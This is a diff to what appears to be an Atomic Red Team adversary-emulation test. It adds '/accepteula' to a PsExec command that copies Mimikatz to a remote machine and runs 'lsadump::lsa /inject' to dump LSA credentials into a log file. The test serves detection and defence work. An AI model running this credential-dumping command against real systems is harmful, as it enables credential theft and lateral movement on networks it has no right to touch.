@@ -25,6 +25,6 @@ atomic_tests:
       default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.log
   executor:
     command: |
-      #{psexec_path} \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject" "exit" > #{output_file}
+      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject" "exit" > #{output_file}
     name: powershell
     elevation_required: true
